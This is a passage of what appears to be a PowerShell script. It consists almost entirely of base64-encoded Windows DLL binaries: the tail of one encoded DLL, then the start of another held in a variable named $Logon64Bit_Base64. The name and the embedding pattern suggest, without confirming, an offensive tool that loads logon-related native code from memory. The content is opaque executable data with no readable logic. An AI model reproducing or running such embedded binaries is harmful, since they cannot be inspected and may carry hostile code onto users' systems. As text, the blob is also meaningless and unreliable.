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sg6DDsVO6875TstPDw8WzyvPME80zzlPPc8CT0bPS09Pz1RPWM9dT2HPaY9uD3KPdw97j0A0AAATAAAADIyPDJCMlYyYjKIMv8yITQpNNE1YzZvNv02BTcRNyA3rDfDN/o3cTiTOZs5QzvVO+E7bzx3PIM8kjwePTU9bz33PQAAAOAAADQAAABXMWkx3TThNOU06TTtNPE09TT5NP00ATUFNQk1FzXVNe41/TUeNlY2szYAAADwAABIAAAA7zAmM1YzczORM6YzsDN7NPA0ATUVNRs1IDVHN343lDe6NzQ4cTh7OJo48jj4OBI5LTlCOUY5UjlWOWI5ZjkAAAAAAQCoAQAALDEwMTQxQDFEMUgxTDFYMVwxYDE8NkQ2TDZUNlw2ZDZsNnQ2fDaENow2lDacNqQ2rDa0Nrw2xDbMNtQ23DbkNuw29Db8NgQ3DDcUNxw3JDcsNzQ3PDdEN0w3VDdcN2Q3bDd0N3w3hDeMN5Q3nDekN6w3tDe8N8Q3zDfUN9w35DfsN/Q3/DcEOAw4FDgcOCQ4LDg0ODw4RDhMOFQ4XDhkOGw4dDh8OIQ4lDicOKQ4rDi0OLw4xDjMONQ43DjkOOw49Dj8OAQ5DDkUORw5JDksOTQ5PDlEOUw5VDlcOWQ5bDl0OXw5hDmMOZQ5nDmkOaw5tDm8OcQ5zDnUOdw55DnsOfQ5/DkEOgw6FDocOiQ6LDo0Ojw6RDpMOlQ6XDpkOmw6dDp8OoQ6jDqUOpw6pDqsOrQ6vDrEOsw61DrcOuQ67Dr0Ovw6BD8IPww/ED8UPxg/HD8gPyQ/KD8sPzA/ND84Pzw/QD9EP0g/TD9QP1Q/WD9cP2A/ZD9oP2w/cD90P3g/fD+QP5Q/mD+cP6A/pD+oP6w/sD+0P7g/4D/kP+g/7D8AEAEAWAAAAAQwCDD4NPw0ADUENSQ1LDU0NTw1RDVMNVQ1XDVkNWw1dDV8NYQ1jDWUNZw1pDWsNbQ1vDXENcw11DWEP4g/jD+QP8w/1D/cP+Q/7D/0P/w/ACABAIwDAAAEMAwwFDAcMCQwLDA0MDwwRDBMMFQwXDBkMGwwdDB8MIQwjDCUMJwwpDCsMLQwvDDEMMww1DDcMOQw7DD0MPwwBDEMMRQxHDEkMSwxNDE8MUQxTDFUMVwxZDFsMXQxfDGEMYwxlDGcMaQxrDG0MbwxxDHMMdQx3DHkMewx9DH8MQQyDDIUMhwyJDIsMjQyPDJEMkwyVDJcMmQybDJ0MnwyhDKMMpQynDKkMqwytDK8MsQyzDLUMtwy5DLsMvQy/DIEMwwzFDMcMyQzLDM0MzwzRDNMM1QzXDNkM2wzdDN8M4QzjDOUM5wzpDOsM7QzvDPEM8wz1DPcM+Qz7DP0M/wzBDQMNBQ0HDQkNCw0NDQ8NEQ0TDRUNFw0ZDRsNHQ0fDSENIw0lDScNKQ0rDS0NLw0xDTMNNQ03DTkNOw09DT8NAQ1DDUUNRw1JDUsNTQ1PDVENUw1VDVcNWQ1bDV0NXw1hDWMNZQ1nDWkNaw1tDW8NcQ1zDXUNdw15DXsNfQ1/DUENgw2FDYcNiQ2LDY0Njw2RDZMNlQ2XDZkNmw2dDZ8NoQ2jDaUNpw2pDasNrQ2vDbENsw21DbcNuQ26DbwNvg2ADcINxA3GDcgNyg3MDc4N0A3SDdQN1g3YDdoN3A3eDeAN4g3kDeYN6A3qDewN7g3wDfIN9A32DfgN+g38Df4NwA4CDgQOBg4IDgoODA4ODhAOEg4UDhYOGA4aDhwOHg4gDiIOJA4mDigOKg4sDi4OMA4yDjQONg44DjoOPA4+DgAOQg5EDkYOSA5KDkwOTg5QDlIOVA5WDlgOWg5cDl4OYA5iDmQOZg5oDmoObA5uDnAOcg50DnYOeA56DnwOfg5ADoIOhA6GDogOig6MDo4OkA6SDpQOlg6YDpoOnA6eDqAOog6kDqYOqA6qDqwOrg6wDrIOtA62DrgOug68Dr4OgA7CDsQOxg7IDsoOzA7ODtAO0g7UDtYO2A7aDtwO3g7gDuIO5A7mDugO6g7sDu4O8A7yDvQO9g74DvoO/A7+DsAPAg8EDwYPCA8KDwwPDg8QDxIPFA8WDxgPGg8cDx4PIA8iDyQPJg8oDyoPLA8uDzAPMg80DzYPOA86DzwPPg8AD0IPRA9GD0gPSg9MD04PUA9SD1QPVg9YD1oPXA9eD2APYg9kD2YPaA9qD2wPbg9wD3IPdA92D3gPeg98D34PQA+AAAAQAEA0AAAAMgwzDDQMNQw2DDcMOAw5DDoMOww8DD0MPgw/DAAMQQxCDEMMRAxFDEYMRwxIDEkMSgxLDEwMTQxODE8MUAxRDFIMUwxUDFUMVgxXDFgMWQxaDFsMXAxdDF4MXwxgDGEMYgxjDGQMZQxmDGcMaAxpDGoMawxsDG0MbgxvDHAMcQxyDHMMdAx1DHYMdwx4DHkMegx7DHwMfQx+DH8MQAyBDIIMgwyEDIUMhgyHDIgMiQyKDIsMjAyNDI4MjwyQDJEMkgyTDJQMgAAAFABADABAADcN+A3bDiEOJQ4mDisOLA4wDjEOMg40DjoOPg4/DgMORA5FDkcOTQ5RDlIOVg5XDlgOWQ5bDmEOZQ5mDmoOaw5sDm0Obw51DnkOeg5+Dn8OQQ6HDosOjA6QDpEOlQ6WDpcOmQ6fDqMOpA6qDq4Orw6wDrEOtg63DrgOvg6/DoUOyQ7KDs4Ozw7QDtIO2A7cDuAO4Q7iDuMO6A7pDuoO6w7+DsAPEQ8WDxoPHg8gDyIPJA8lDycPLA8uDzMPNQ86DzwPPg8AD0EPQg9ED0kPSw9ND08PUA9RD1MPWA9gD2gPbw9wD3gPfw9AD4gPkA+TD5oPnQ+kD6sPrA+zD7QPvA++D78Phg/ID8kPzw/QD9cP2A/cD+UP6A/qD/UP9g/4D/oP/A/9D/8PwBgAQAsAAAAEDAwMEwwUDBwMJAwsDDQMPAwEDEwMTwxWDF4MZgxuDHYMfgxAHABAFABAABkMGwwdDB8MIQwjDCUMJwwpDCsMLQwvDDEMMww1DDcMOQw7DD0MPwwBDEMMRQxHDEkMSwxNDE8MUQxcDF0MUAzRDNIM0wzUDNUM1gzXDNgM2QztDjAOcg5SDxMPFA8VDxYPFw8YDxkPGg8bDxwPHQ8eDx8PIA8hDyIPIw8kDyUPJg8nDygPKQ8qDysPLA8tDy4PLw8wDzEPMg8zDzQPNQ82DzcPOA85DzoPOw88Dz8PAA9BD0IPQw9ED0UPRg9HD0gPSQ9KD0sPTA9ND04PTw9QD1EPUg9TD1QPVQ9WD1cPWA9ZD1oPWw9cD10PXg9fD2APYQ9iD2MPZA9lD2YPZw9oD2kPag9rD3UPeQ99D0EPhQ+ND5APkQ+SD5MPoA+iD6MPpA+lD6YPpw+oD6kPqg+rD64Prw+wD7EPsg+zD7QPtQ+3D7gPuQ+AIABACQAAADoMewx8DH0MRAyLDJMMmwyjDKkMsQy8DIcM0AzAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="
        $Logon64Bit_Base64 = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAAAd9fAjWZSecFmUnnBZlJ5wH8V+cCmUnnAfxUFwUpSecB/Ff3B0lJ5whGtVcF6UnnBZlJ9wA5SecFTGe3BalJ5wVMZCcFiUnnBUxkVwWJSecFTGQHBYlJ5wUmljaFmUnnAAAAAAAAAAAAAAAAAAAAAAUEUAAGSGBgDy6PtSAAAAAAAAAADwACIgCwIMAAD4AAAA7gAAAAAAAKAvAAAAEAAAAAAAgAEAAAAAEAAAAAIAAAYAAAAAAAAABgAAAAAAAAAAIAIAAAQAAAAAAAACAGABAAAQAAAAAAAAEAAAAAAAAAAAEAAAAAAAABAAAAAAAAAAAAAAEAAAAECdAQBFAAAAiJ0BAFAAAAAAAAIA4AEAAADwAQC8DQAAAAAAAAAAAAAAEAIA+AcAAAATAQA4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIcBAHAAAAAAAAAAAAAAAAAQAQBwAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALnRleHQAAAD/9gAAABAAAAD4AAAABAAAAAAAAAAAAAAAAAAAIAAAYC5yZGF0YQAA+pUAAAAQAQAAlgAAAPwAAAAAAAAAAAAAAAAAAEAAAEAuZGF0YQAAAHg+AAAAsAEAABoAAACSAQAAAAAAAAAAAAAAAABAAADALnBkYXRhAAC8DQAAAPABAAAOAAAArAEAAAAAAAAAAAAAAAAAQAAAQC5yc3JjAAAA4AEAAAAAAgAAAgAAALoBAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAPgHAAAAEAIAAAgAAAC8AQAAAAAAAAAAAAAAAABAAABCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEiNDen2AADp/BwAAMzMzMxIjQ3J9gAA6ewcAADMzMzMSI0NqfYAAOncHAAAzMzMzEBTSIPsIEiNBfsVAQBIi9lIiQH2wgF0Bej/HAAASIvDSIPEIFvDzMzMzMzMzMzMzESJAkiJSghIi8LDzMzMzMxAU0iD7DBIiwFJi9hEi8JIjVQkIP9QGEiLSwhIOUgIdQ6LCzkIdQiwAUiDxDBbwzLASIPEMFvDzMzMzMzMzMzMSDtKCHUIRDkCdQOwAcMywMPMzMzMzMzMzMzMzMzMzMxIjQVBcwEAw8zMzMzMzMzMSIlcJAhXSIPsMDPbQYvISIv6iVwkIOjxEgAASMdHGA8AAABIhcBIiV